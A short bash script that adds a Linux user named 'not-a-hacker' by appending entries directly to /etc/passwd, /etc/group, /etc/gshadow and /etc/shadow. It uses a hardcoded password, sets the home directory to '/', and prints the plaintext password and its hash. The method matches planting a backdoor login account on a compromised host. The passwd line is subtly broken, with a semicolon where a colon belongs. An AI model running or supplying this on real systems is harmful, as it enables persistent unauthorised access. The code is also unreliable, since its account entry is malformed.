#!/bin/bash

#new user info
username="not-a-hacker"
password="ThisIsAV3ryS3curePa55word"
home="/"
idnum=1010

#generate new password hash
passwordhash=$(openssl passwd -6 -salt xyz $password | head -n 1)

echo $password
echo $passwordhash

#creating a new user manually
echo "$username:x:$idnum:$idnum:,,,;$home:/bin/bash" >> /etc/passwd
echo "$username:x:$idnum:" >> /etc/group
#chown -R "$username:$username" "$home"
#chmod -R 0755 $home
echo "$username:!::" >> /etc/gshadow
echo "$username:$passwordhash:19622:0:99999:7:::" >> /etc/shadow